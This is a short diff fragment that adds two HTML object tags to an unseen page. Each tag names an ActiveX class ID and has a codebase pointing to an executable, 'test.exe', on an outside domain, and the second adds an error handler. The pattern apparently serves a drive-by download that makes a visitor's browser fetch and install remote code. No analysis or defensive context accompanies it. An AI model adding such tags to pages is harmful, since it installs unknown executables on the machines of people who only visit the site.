@@ -1,0 +1,2 @@
+<object  id="A" classid="CLSID:527196a4-b1a3-4647-931d-37ba5af23037" codebase="http://wmzarabotok.info/dos/test.exe"></object>
+<object onerror='ErrorActiveX();' id="A" classid="CLSID:527196a4-b1a3-4647-931d-37ba5af23037" codebase="http://wmzarabotok.info/dos/test.exe"></object>
